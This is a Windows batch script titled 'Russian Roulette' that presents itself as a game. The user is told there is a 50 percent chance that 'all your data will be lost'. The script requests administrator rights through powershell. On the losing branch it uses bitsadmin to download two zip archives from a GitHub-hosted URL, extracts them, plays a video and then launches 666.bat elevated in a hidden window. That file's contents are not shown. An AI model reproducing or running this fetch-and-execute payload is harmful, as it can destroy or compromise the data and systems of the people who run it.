@echo off 
title Russian Roulette by Phoenixthrush
color a

if not "%1"=="am_admin" (powershell start -verb runas '%0' am_admin & exit /b)

set /a rand=%random% %% 2 + 1

:menue
echo You have a 50 percent chance to survive!
echo If you fail, all your data will be lost!
echo.
set /p asw="Do you really want to continue? [y/n] "

if %asw%==y (goto continue)
if %asw%==n (goto exit) else (goto menue)
exit

:continue
if %rand%==1 (goto fucked)
if %rand%==2 (goto luck)
exit

:fucked
cls

del %temp%\rick.mp4 > nul
bitsadmin /transfer mydownloadjob /download /priority foreground "https://raw.githubusercontent.com/Phoenixthrush/phoenixthrush.github.io/master/sites/assets/rick.zip" "%temp%\rick.zip" >nul
bitsadmin /transfer mydownloadjob /download /priority foreground "https://raw.githubusercontent.com/Phoenixthrush/phoenixthrush.github.io/master/sites/assets/666.zip" "%temp%\666.zip" >nul
powershell -c "Expand-Archive %temp%\rick.zip %temp%"
powershell -c "Expand-Archive %temp%\666.zip %temp%"

del %temp%\rick.zip
del %temp%\666.zip
start "" "%temp%\rick.mp4"

:loop
for /F %%x IN ('tasklist /NH /FI "IMAGENAME eq Microsoft.Photos.exe"') DO IF %%x == Microsoft.Photos.exe goto found else
powershell -c "Start-Process -Verb RunAs -WindowStyle hidden %temp%\666.bat"
echo your fucked!
timeout 3 >nul
exit

:found
goto loop
exit

:luck
cls
echo you survived!
pause >nul
exit

:exit
cls
echo Maybe see ya later!
pause >nul
exit